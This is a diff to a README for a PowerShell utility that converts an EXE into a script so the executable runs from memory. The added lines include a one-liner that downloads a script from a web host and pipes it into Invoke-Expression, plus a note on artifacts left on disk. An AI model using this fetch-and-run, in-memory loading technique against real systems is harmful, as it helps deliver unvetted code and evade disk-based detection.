@@ -7,3 +7,18 @@ Create a Powershell-invoked version of an EXE:
 ```
 ./Exe-ToInvokeScript.ps1 -InFile <file.exe> -OutFile <outfile.ps1>
 ```
+
+Loading the script via the web
+
+```
+iex (iwr http://somesite.com/Invoke-MyScriptName.ps1 -usebasicparsing)
+```
+
+Run the executable 
+
+```
+Invoke-MyScriptName -Arguments '<exe arguments>'
+```
+
+# Limitations
+Note: Some EXEs will run better than others using this technique. The most suitable EXEs are ones which run via commandline arguments. Although the EXEs should run from memory, nothing will prevent them from writing artifacts to disk if this is what they normally do.
